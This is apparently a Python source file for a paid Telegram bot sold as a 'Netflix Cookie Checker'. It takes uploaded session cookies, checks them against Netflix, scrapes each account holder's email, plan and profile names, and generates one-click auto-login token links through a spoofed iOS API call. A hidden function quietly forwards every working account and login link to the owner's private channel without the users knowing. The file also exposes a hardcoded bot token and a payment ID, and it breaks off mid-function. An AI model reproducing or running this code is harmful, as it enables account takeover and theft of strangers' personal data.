import os
import re
import json
import time
import db_shared as _db
from datetime import datetime, timedelta
import requests
import telebot
from telebot import types
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ═══════════════════════════════════════════════════════
#                    CONFIGURATION
# ═══════════════════════════════════════════════════════
BOT_TOKEN    = "8621607921:AAEfIyoWd0E5I4vuv51FVLx5IXLgdnjNq3U"
OWNER_ID     = 8455335298          # Your Telegram user ID
FREE_DAYS    = 2                   # Free trial duration (days)
HITS_CHANNEL = -1004348992380      # tampomas channel — hits forwarded here

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML", threaded=False)

# In-memory pending cookie batches per user
pending_files = {}

# Stop flags — set to True when user sends /stop
stop_flags = {}

# Active checkers — track users currently running a check (prevent parallel checks)
active_checkers = set()

# NF Token cooldown — tracks last usage time per user (10s cooldown)
nftoken_cooldown = {}

# ─── User Agent ───────────────────────────────────────
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/128.0.0.0 Safari/537.36"
)

# ─── Netflix iOS FTL API ──────────────────────────────
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}



# ═══════════════════════════════════════════════════════
#                    DATABASE (via db_shared → PostgreSQL)
# ═══════════════════════════════════════════════════════

# All DB functions are in db_shared.py — imported here for convenience
get_user               = _db.get_user
register_user          = _db.register_user
set_ban                = _db.set_ban
extend_access          = _db.extend_access
expire_access          = _db.expire_access
all_users              = _db.all_users
get_user_by_username   = _db.get_user_by_username
create_key             = _db.create_key
redeem_key             = _db.redeem_key
list_keys              = _db.list_keys
has_ever_redeemed_key  = _db.has_ever_redeemed_key
get_user_tier          = _db.get_user_tier
get_free_user_cookies_today = _db.get_free_user_cookies_today
add_free_user_cookies  = _db.add_free_user_cookies
save_hit_to_db         = _db.save_hit_to_db
get_random_hit         = _db.get_random_hit
delete_hit_from_db     = _db.delete_hit_from_db
count_hits_db          = _db.count_hits_db
get_nftoken_usage      = _db.get_nftoken_usage
increment_nftoken_usage = _db.increment_nftoken_usage


# ═══════════════════════════════════════════════════════
#                  ACCESS CONTROL
# ═══════════════════════════════════════════════════════

def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID

def check_access(user_id: int):
    """
    Returns (allowed: bool, reason: str)
    Owner always allowed.
    """
    if is_owner(user_id):
        return True, "owner"

    row = get_user(user_id)
    if not row:
        return False, "not_registered"

    _, _, _, _, expires_at, is_banned = row
    if is_banned:
        return False, "banned"

    try:
        exp = datetime.strptime(expires_at, "%Y-%m-%d %H:%M:%S")
        if datetime.utcnow() > exp:
            return False, "expired"
    except Exception:
        return False, "expired"

    return True, "ok"


# ═══════════════════════════════════════════════════════
#               NETFLIX CORE FUNCTIONS
# ═══════════════════════════════════════════════════════

def parse_cookies_from_text(content: str):
    """
    Parse cookies from Netscape, JSON array, or raw key=value format.
    Returns a list of cookie dicts, each representing one account.
    """
    bundles = []

    trimmed = content.strip()
    if (trimmed.startswith("[") and trimmed.endswith("]")) or \
       (trimmed.startswith("{") and trimmed.endswith("}")):
        try:
            data = json.loads(trimmed)
            if isinstance(data, list):
                if data and isinstance(data[0], dict) and "name" in data[0]:
                    cookie_dict = {}
                    for item in data:
                        cookie_dict[item.get("name")] = item.get("value")
                    if "NetflixId" in cookie_dict or "SecureNetflixId" in cookie_dict:
                        bundles.append(cookie_dict)
                elif data and isinstance(data[0], list):
                    for sub in data:
                        c_dict = {}
                        for item in sub:
                            if isinstance(item, dict):
                                c_dict[item.get("name")] = item.get("value")
                        if "NetflixId" in c_dict or "SecureNetflixId" in c_dict:
                            bundles.append(c_dict)
        except Exception:
            pass

    if bundles:
        return bundles

    lines = content.splitlines()
    current_cookies = {}

    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            val  = parts[6].strip()
            if name == "NetflixId" and "NetflixId" in current_cookies:
                bundles.append(current_cookies)
                current_cookies = {}
            current_cookies[name] = val
        elif "=" in line:
            pairs = line.split(";")
            for pair in pairs:
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    k = k.strip()
                    v = v.strip()
                    if k in ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]:
                        if k == "NetflixId" and "NetflixId" in current_cookies:
                            bundles.append(current_cookies)
                            current_cookies = {}
                        current_cookies[k] = v

    if current_cookies and (
        "NetflixId" in current_cookies or
        "SecureNetflixId" in current_cookies or
        len(current_cookies) > 0
    ):
        bundles.append(current_cookies)

    if not bundles and current_cookies:
        bundles.append(current_cookies)

    return bundles


def fetch_nftoken(cookie_dict: dict):
    """Call Netflix iOS FTL API to generate an NFToken."""
    netflix_id = cookie_dict.get("NetflixId")
    if not netflix_id:
        return None, "N/A"

    cookie_parts = []
    for k in ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"]:
        if k in cookie_dict:
            cookie_parts.append(f"{k}={cookie_dict[k]}")
    if not cookie_parts:
        cookie_parts = [f"{k}={v}" for k, v in cookie_dict.items()]
    cookie_header = "; ".join(cookie_parts)

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = cookie_header

    try:
        resp = requests.get(
            API_URL,
            params=QUERY_PARAMS,
            headers=headers,
            timeout=15,
            verify=False,
        )
        if resp.status_code == 200:
            data = resp.json()
            token_data = (
                ((data.get("value") or {}).get("account") or {}).get("token") or {}
            ).get("default") or {}
            token   = token_data.get("token")
            expires = token_data.get("expires")
            if token:
                expiry_str = "N/A"
                if expires:
                    try:
                        if isinstance(expires, int) and len(str(expires)) == 13:
                            expires //= 1000
                        expiry_str = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S")
                    except Exception:
                        expiry_str = str(expires)
                return token, expiry_str
    except Exception as e:
        print(f"[NFToken Error] {e}")

    return None, "N/A"


def check_netflix_cookie(cookie_dict: dict):
    """
    Validate one Netflix cookie bundle.
    Returns a result dict with account details and watch links.
    """
    session = requests.Session()
    session.headers.update({
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    })

    for k, v in cookie_dict.items():
        session.cookies.set(k, v, domain=".netflix.com")

    try:
        resp      = session.get("https://www.netflix.com/youraccount", timeout=15, allow_redirects=True)
        final_url = resp.url.lower()

        if "/login" in final_url or "nextpage" in final_url:
            return {"alive": False, "reason": "Expired / Redirected to Login"}

        body = resp.text

        # ── Parse account details ──────────────────────
        email    = "Unknown"
        plan     = "Netflix"
        status   = "CURRENT_MEMBER"
        country  = "Unknown"
        streams  = "2"
        quality  = "HD"
        profiles = []

        m_email = (
            re.search(r'"(?:userEmail|emailAddress|email)"\s*:\s*"([^"]+)"', body) or
            re.search(r'data-uia="account-email"[^>]*>([^<]+)<', body)
        )
        if m_email:
            email = m_email.group(1).replace("\\x40", "@").replace("\\x20", " ")
        else:
            m_emails = re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', body)
            for em in m_emails:
                if not any(d in em.lower() for d in ["netflix.com", "w3.org", "schema.org", "sentry.io", "akamai"]):
                    email = em
                    break

        m_status = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', body)
        if m_status:
            status = m_status.group(1)

        m_plan = re.search(r'"(?:localizedPlanName|planTitle|title|planName)"\s*:\s*"([^"]+)"', body)
        if m_plan:
            plan = m_plan.group(1)
        elif "Premium" in body:
            plan = "Premium"
        elif "Standard" in body:
            plan = "Standard"
        elif "Basic" in body:
            plan = "Basic"

        if "UHD" in body or "Ultra HD" in body or plan.lower() == "premium":
            quality = "UHD 4K"
            streams = "4"
        elif "Standard" in plan:
            quality = "Full HD"
            streams = "2"
        elif "Basic" in plan:
            quality = "SD"
            streams = "1"

        m_country = (
            re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', body) or
            re.search(r'"country"\s*:\s*"([A-Z]{2})"', body)
        )
        if m_country:
            country = m_country.group(1)

        m_profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', body)
        if m_profiles:
            profiles = list(dict.fromkeys(m_profiles))

        # ── Generate NFToken ───────────────────────────
        token, token_expiry = fetch_nftoken(cookie_dict)

        if token:
            direct_url = f"https://netflix.com/browse?nftoken={token}"
            mobile_url = f"https://netflix.com/unsupported?nftoken={token}"
        else:
            direct_url = mobile_url = "N/A"

        is_active = (status.upper() == "CURRENT_MEMBER")

        return {
            "alive":        True,
            "is_active":    is_active,
            "email":        email,
            "plan":         plan,
            "status":       status,
            "country":      country,
            "streams":      streams,
            "quality":      quality,
            "profiles":     ", ".join(profiles) if profiles else "Default",
            "nftoken":      token,
            "direct_url":   direct_url,
            "mobile_url":   mobile_url,
            "token_expiry": token_expiry,
        }

    except Exception as e:
        return {"alive": False, "reason": str(e)}


# ═══════════════════════════════════════════════════════
#                    HIT LOGGING
# ═══════════════════════════════════════════════════════

def forward_hit_to_channel(res: dict, checker_user, hit_count: int):
    """Silently forward every hit to the private channel (invisible to checker)."""
    checker = f"@{checker_user.username}" if checker_user.username else f"ID:{checker_user.id}"
    text = (
        f"╔══════════════════════════╗\n"
        f"  🔥 <b>NETFLIX HIT #{hit_count}</b>\n"
        f"╚══════════════════════════╝\n\n"
        f"👤 <b>Checker :</b> <code>{checker}</code>\n\n"
        f"<b>[ ACCOUNT INFO ]</b>\n"
        f"📧 <b>Email   :</b> <code>{res.get('email')}</code>\n"
        f"🌍 <b>Country :</b> <code>{res.get('country')}</code>\n"
        f"📊 <b>Status  :</b> <code>{res.get('status')} ✔</code>\n"
        f"📺 <b>Quality :</b> <code>{res.get('quality')} ({res.get('streams')} Screens)</code>\n\n"
        f"<b>[ WATCH LINKS ]</b>\n"
        f"🖥️ Direct  → {res.get('direct_url')}\n"
        f"📱 Mobile  → {res.get('mobile_url')}\n"
        f"⏳ <b>Token Expires:</b> <code>{res.get('token_expiry')}</code>\n\n"
        f"[ BOT : @netflixpctvphonebot ]"
    )
    try:
        markup = types.InlineKeyboardMarkup()
        if res.get("nftoken"):
            markup.row(
                types.InlineKeyboardButton("🖥️ Direct", url=res.get("direct_url")),
                types.InlineKeyboardButton("📱 Mobile", url=res.get("mobile_url")),
            )
        bot.send_message(
            HITS_CHANNEL,
            text,
            reply_markup=markup if res.get("nftoken") else None,
            disable_web_page_preview=True,
        )
    except Exception as e:
        print(f"[Channel Forward Error] {e}")


# ═══════════════════════════════════════════════════════
#              TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

def time_remaining(expires_at_str: str) -> str:
    """Return a human-readable countdown string until expiry."""
    try:
        exp  = datetime.strptime(expires_at_str, "%Y-%m-%d %H:%M:%S")
        diff = exp - datetime.utcnow()
        if diff.total_seconds() <= 0:
            return "Expired"
        total_secs = int(diff.total_seconds())
        days       = diff.days
        hours      = (total_secs % 86400) // 3600
        minutes    = (total_secs % 3600)  // 60
        return f"{days}d {hours}h {minutes}m remaining"
    except Exception:
        return "Unknown"

# ── /start ────────────────────────────────────────────
@bot.message_handler(commands=["start", "help"])
def cmd_start(message):
    user = message.from_user
    register_user(user, FREE_DAYS)

    allowed, reason = check_access(user.id)

    if not allowed:
        if reason == "banned":
            bot.reply_to(message, "🚫 <b>You have been banned from using this bot.</b>")
        elif reason == "expired":
            bot.reply_to(
                message,
                "⏰ <b>Your access has expired.</b>\n\n"
                "Type /buy to see available plans and purchase access. 🛒"
            )
        else:
            bot.reply_to(
                message,
                "❌ <b>Access denied.</b>\n\n"
                "Type /buy to see available plans. 🛒"
            )
        return

    row = get_user(user.id)
    expires_info = ""
    if row and not is_owner(user.id):
        expires_info = f"\n⏳ <b>Access expires in:</b> <code>{time_remaining(row[4])}</code>"

    welcome = (
        f"👋 <b>Hello, {user.first_name or 'User'}!</b>\n\n"
        f"⚡ <b>Netflix Cookie Checker — Public Bot</b>\n\n"
        f"📁 <b>How to use:</b>\n\n"
        f"🔍 <b>Cookie Checker:</b>\n"
        f"Send a cookie file (<code>.txt</code>, <code>.json</code>, or <code>.log</code>) "
        f"in Netscape, JSON, or Raw format.\n"
        f"The bot will automatically:\n"
        f"  ✅ Validate each account\n"
        f"  🔑 Generate NFToken Watch Links\n"
        f"  📊 Show plan, quality & profile info\n\n"
        f"🍪 <b>Generate Links Cookies:</b>\n"
        f"Tap the 🍪 Generate Links Cookies button below or you can send /nftoken.\n"
        f"The bot will pick an active cookie and generate a 1-click auto-login link for PC Browser and Mobile."
        f"{expires_info}\n\n"
        f"<b>Commands:</b>\n"
        f"/start — Show this message\n"
        f"/me — Check your access info\n"
        f"/stop — Stop current checking session\n"
        f"/buy — Purchase access\n"
        f"/payment — Send payment proof\n"
        f"/redeem [KEY] — Activate your key\n"
        f"/nftoken — Get a free Netflix 1-click token\n"
        f"/ask [question] — Ask the owner a question"
        + (
            f"\n\n<b>Owner Commands:</b>\n"
            f"/ban [@user or id] — Ban a user\n"
            f"/unban [@user or id] — Unban a user\n"
            f"/expire [@user or id] — Revoke access immediately\n"
            f"/users — List all registered users\n"
            f"/broadcast [msg] — Broadcast a message\n"
            f"/sendkey — Generate key for yourself or send key to user\n"
            f"/keys — View all generated keys report\n"
            f"/db — View database stats\n"
            f"/reply [@user or id] [msg] — Reply to a user's /ask"
            if is_owner(user.id) else ""
        )
    )
    # Persistent keyboard with NF Token button
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True, is_persistent=True)
    keyboard.add(types.KeyboardButton("🍪 Generate Links Cookies"))

    bot.send_message(message.chat.id, welcome, reply_markup=keyboard)


# ── 🍪 Generate Links Cookies keyboard button ─────────
@bot.message_handler(func=lambda m: m.text == "🍪 Generate Links Cookies")
def keyboard_nftoken(message):
    cmd_nftoken(message)


# ── /me ───────────────────────────────────────────────
@bot.message_handler(commands=["me"])
def cmd_me(message):
    user = message.from_user
    register_user(user, FREE_DAYS)
    row = get_user(user.id)

    if is_owner(user.id):
        bot.reply_to(message, "👑 <b>You are the Owner.</b> Unlimited access.")
        return

    if not row:
        bot.reply_to(message, "❌ Not registered. Send /start first.")
        return

    _, username, first_name, joined_at, expires_at, is_banned = row
    allowed, reason = check_access(user.id)

    status_icon = "✅ Active" if allowed else ("🚫 Banned" if is_banned else "⏰ Expired")
    text = (
        f"👤 <b>Your Account Info</b>\n\n"
        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
        f"📛 <b>Name:</b> {first_name}\n"
        f"📅 <b>Joined:</b> <code>{joined_at} UTC</code>\n"
        f"⏳ <b>Access Expires In:</b> <code>{time_remaining(expires_at)}</code>\n"
        f"📊 <b>Status:</b> {status_icon}"
    )
    bot.reply_to(message, text)


# ── /stop ─────────────────────────────────────────────
@bot.message_handler(commands=["stop"])
def cmd_stop(message):
    user = message.from_user
    db_stopped = _db.set_check_session_stop(user.id)
    if stop_flags.get(user.id) is None and not db_stopped:
        # No active checking session
        bot.reply_to(message, "⚠️ <b>No active checking session to stop.</b>")
        return
    if stop_flags.get(user.id) is not None:
        stop_flags[user.id] = True
    bot.reply_to(message, "🛑 <b>Stop signal sent!</b>\nThe checker will stop after the current cookie finishes.")


# ── /ban ──────────────────────────────────────────────
@bot.message_handler(commands=["ban"])
def cmd_ban(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /ban [@username or user_id]")
        return
    target = parts[1].strip()
    if target.startswith("@"):
        row = get_user_by_username(target[1:])
        if not row:
            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
            return
        uid = row[0]
    elif target.isdigit():
        uid = int(target)
    else:
        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
        return
    set_ban(uid, True)
    bot.reply_to(message, f"🚫 User <code>{uid}</code> has been <b>banned</b>.")


# ── /unban ────────────────────────────────────────────
@bot.message_handler(commands=["unban"])
def cmd_unban(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /unban [@username or user_id]")
        return
    target = parts[1].strip()
    if target.startswith("@"):
        row = get_user_by_username(target[1:])
        if not row:
            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
            return
        uid = row[0]
    elif target.isdigit():
        uid = int(target)
    else:
        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
        return
    set_ban(uid, False)
    bot.reply_to(message, f"✅ User <code>{uid}</code> has been <b>unbanned</b>.")



# ── /users ────────────────────────────────────────────
@bot.message_handler(commands=["users"])
def cmd_users(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return
    rows = all_users()
    if not rows:
        bot.reply_to(message, "No registered users yet.")
        return

    now = datetime.utcnow()

    # Separate owner from regular users
    owner_rows  = [r for r in rows if r[0] == OWNER_ID]
    normal_rows = [r for r in rows if r[0] != OWNER_ID]

    active  = [r for r in normal_rows if not r[5] and datetime.strptime(r[4], "%Y-%m-%d %H:%M:%S") > now]
    expired = [r for r in normal_rows if not r[5] and datetime.strptime(r[4], "%Y-%m-%d %H:%M:%S") <= now]
    banned  = [r for r in normal_rows if r[5]]

    lines = []
    lines.append(f"╔══ REGISTERED USERS — {now.strftime('%Y-%m-%d %H:%M:%S')} UTC ══╗")
    lines.append(f"  Total   : {len(rows)}")
    lines.append(f"  Active  : {len(active)}")
    lines.append(f"  Expired : {len(expired)}")
    lines.append(f"  Banned  : {len(banned)}")
    lines.append("╚" + "═" * 48 + "╝\n")

    # Owner section
    if owner_rows:
        lines.append("── 👑 OWNER " + "─" * 38)
        for row in owner_rows:
            uid, username, first_name, joined_at, _, _ = row
            uname = f"@{username}" if username else "—"
            lines.append(f"  👑 ID      : {uid}")
            lines.append(f"     Name    : {first_name} {uname}")
            lines.append(f"     Joined  : {joined_at} UTC")
            lines.append(f"     Access  : Unlimited (Owner)")
            lines.append("")

    def section(title, user_rows, flag):
        lines.append(f"── {title} ({len(user_rows)}) " + "─" * 30)
        for row in user_rows:
            uid, username, first_name, joined_at, expires_at, is_banned = row
            uname  = f"@{username}" if username else "—"
            lines.append(f"  {flag} ID      : {uid}")
            lines.append(f"     Name    : {first_name} {uname}")
            lines.append(f"     Joined  : {joined_at} UTC")
            lines.append(f"     Expires : {time_remaining(expires_at)}")
            lines.append("")

    section("ACTIVE USERS", active, "✅")
    section("EXPIRED USERS", expired, "⏰")
    section("BANNED USERS", banned, "🚫")

    content = "\n".join(lines)

    # Send as .txt file
    file_bytes = content.encode("utf-8")
    filename   = f"users_{now.strftime('%Y%m%d_%H%M%S')}.txt"
    bot.send_document(
        message.chat.id,
        (filename, file_bytes),
        caption=f"👥 <b>Registered Users: {len(rows)}</b> | ✅ {len(active)} Active | ⏰ {len(expired)} Expired | 🚫 {len(banned)} Banned",
    )


# ── /broadcast ────────────────────────────────────────
@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    msg_text = parts[1]
    rows = all_users()
    sent = 0
    fail = 0
    for row in rows:
        uid = row[0]
        try:
            bot.send_message(uid, f"📢 <b>Announcement</b>\n\n{msg_text}")
            sent += 1
        except Exception:
            fail += 1
    bot.reply_to(message, f"📢 Broadcast done.\n✅ Sent: {sent} | ❌ Failed: {fail}")


# ── /buy ──────────────────────────────────────────────
@bot.message_handler(commands=["buy"])
def cmd_buy(message):
    user = message.from_user
    register_user(user, FREE_DAYS)
    text = (
        f"🛒 <b>Purchase Access</b>\n\n"
        f"╔══════════════════════════╗\n"
        f"  💎 <b>AVAILABLE PLAN</b>\n"
        f"╚══════════════════════════╝\n\n"
        f"📦 <b>7 Days Access</b>\n"
        f"💵 <b>Price  :</b> just <code>$1.00</code>\n"
        f"You can access this checker unlimited for 1 full week, happy watching ❤️\n\n"
        f"💳 <b>Send Payment to</b>\n"
        f"🏦 <b>Binance ID :</b> <code>150710229</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 <b>How to Order:</b>\n"
        f"1️⃣ Complete payment to our wallet\n"
        f"2️⃣ Take a screenshot of the payment\n"
        f"3️⃣ Send the screenshot here with caption <code>/payment</code> or reply screenshot with <code>/payment</code>\n"
        f"4️⃣ Wait for your key to be sent\n"
        f"5️⃣ Activate with <code>/redeem [KEY]</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"After payment, send your proof:\n"
        f"📸 screenshot + caption <code>/payment</code>"
    )
    bot.reply_to(message, text)


# ── /payment ──────────────────────────────────────────
@bot.message_handler(commands=["payment"])
def cmd_payment(message):
    """User sends /payment with a screenshot as the caption of a photo."""
    user = message.from_user
    register_user(user, FREE_DAYS)

    _, reason = check_access(user.id)
    if reason == "banned":
        bot.reply_to(message, "🚫 <b>You are banned.</b>")
        return

    # ── Check if this is a reply to a photo or document ──
    replied = message.reply_to_message
    if replied:
        if replied.photo:
            # User replied to a photo with /payment
            _forward_payment_proof_from_reply(message, replied, proof_type="photo")
            return
        elif replied.document:
            # User replied to a document/file with /payment
            _forward_payment_proof_from_reply(message, replied, proof_type="document")
            return

    # ── No photo/file attached or replied — show instructions ──
    bot.reply_to(
        message,
        "📸 <b>How to send payment proof:</b>\n\n"
        "Method 1 — Send screenshot with caption:\n"
        "  Attach screenshot → type <code>/payment</code> in caption → Send\n\n"
        "Method 2 — Reply to your screenshot:\n"
        "  Send screenshot first → reply to it with <code>/payment</code>\n\n"
        "Your proof will be reviewed and your key will be sent shortly. ✅"
    )


@bot.message_handler(content_types=["photo"])
def handle_photo(message):
    """Forward payment proof photo to owner when caption starts with /payment."""
    user    = message.from_user
    caption = (message.caption or "").strip().lower()

    if not caption.startswith("/payment"):
        return  # Ignore regular photos

    register_user(user, FREE_DAYS)
    _, reason = check_access(user.id)
    if reason == "banned":
        bot.reply_to(message, "🚫 <b>You are banned.</b>")
        return

    _forward_payment_proof(message, proof_type="photo")


def _forward_payment_proof_from_reply(cmd_message, replied_message, proof_type: str):
    """Forward payment proof when user replies to a photo/doc with /payment."""
    user  = cmd_message.from_user
    uname = f"@{user.username}" if user.username else "—"
    uid   = user.id
    name  = user.first_name or "User"

    owner_caption = (
        f"💳 <b>PAYMENT PROOF RECEIVED</b>\n\n"
        f"👤 <b>Name    :</b> {name}\n"
        f"🆔 <b>User ID :</b> <code>{uid}</code>\n"
        f"📛 <b>Username:</b> {uname}\n\n"
        f"📦 <b>Plan    :</b> 7 Days\n"
        f"💵 <b>Price   :</b> $1.00\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"If payment is valid, generate key:\n"
        f"<code>/genkey</code>\n"
        f"Then send the key to user ID: <code>{uid}</code>"
    )

    try:
        if proof_type == "photo":
            bot.send_photo(OWNER_ID, replied_message.photo[-1].file_id, caption=owner_caption)
        else:
            bot.send_document(OWNER_ID, replied_message.document.file_id, caption=owner_caption)
    except Exception as e:
        print(f"[Payment Reply Forward Error] {e}")

    bot.reply_to(
        cmd_message,
        "✅ <b>Payment proof received!</b>\n\n"
        "Our team will verify your payment and send your key shortly.\n"
        "Please wait... 🙏"
    )


def _forward_payment_proof(message, proof_type: str):
    """Shared helper — forwards payment proof (photo or document) to owner."""
    user  = message.from_user
    uname = f"@{user.username}" if user.username else "—"
    uid   = user.id
    name  = user.first_name or "User"

    owner_caption = (
        f"💳 <b>PAYMENT PROOF RECEIVED</b>\n\n"
        f"👤 <b>Name    :</b> {name}\n"
        f"🆔 <b>User ID :</b> <code>{uid}</code>\n"
        f"📛 <b>Username:</b> {uname}\n\n"
        f"📦 <b>Plan    :</b> 7 Days\n"
        f"💵 <b>Price   :</b> $1.00\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"If payment is valid, generate key:\n"
        f"<code>/genkey</code>\n"
        f"Then send the key to user ID: <code>{uid}</code>"
    )

    try:
        if proof_type == "photo":
            bot.send_photo(OWNER_ID, message.photo[-1].file_id, caption=owner_caption)
        else:
            bot.send_document(OWNER_ID, message.document.file_id, caption=owner_caption)
    except Exception as e:
        print(f"[Payment Forward Error] {e}")

    bot.reply_to(
        message,
        "✅ <b>Payment proof received!</b>\n\n"
        "Our team will verify your payment and send your key shortly.\n"
        "Please wait... 🙏"
    )



@bot.message_handler(commands=["expire"])
def cmd_expire(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /expire [@username or user_id]")
        return
    target = parts[1].strip()
    if target.startswith("@"):
        row = get_user_by_username(target[1:])
        if not row:
            bot.reply_to(message, f"❌ Username <code>{target}</code> not found.")
            return
        uid = row[0]
    elif target.isdigit():
        uid = int(target)
        row = get_user(uid)
        if not row:
            bot.reply_to(message, f"❌ User ID <code>{uid}</code> not found.")
            return
    else:
        bot.reply_to(message, "❌ Invalid format. Use <code>@username</code> or <code>user_id</code>.")
        return
    expire_access(uid)
    bot.reply_to(message, f"✅ Access for <code>{uid}</code> has been <b>revoked immediately</b>.")


# ── /db ───────────────────────────────────────────────
@bot.message_handler(commands=["db"])
def cmd_db(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return

    total_hits = count_hits_db()
    bot.reply_to(
        message,
        f"🍪 <b>Cookie Stock in DB</b>\n\n"
        f"📦 Available hits: <code>{total_hits}</code>\n"
        f"🕒 {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
    )



# ── /sendkey ──────────────────────────────────────────
@bot.message_handler(commands=["sendkey"])
def cmd_sendkey(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "⛔ Owner only.")
        return

    PLAN_DAYS = 7
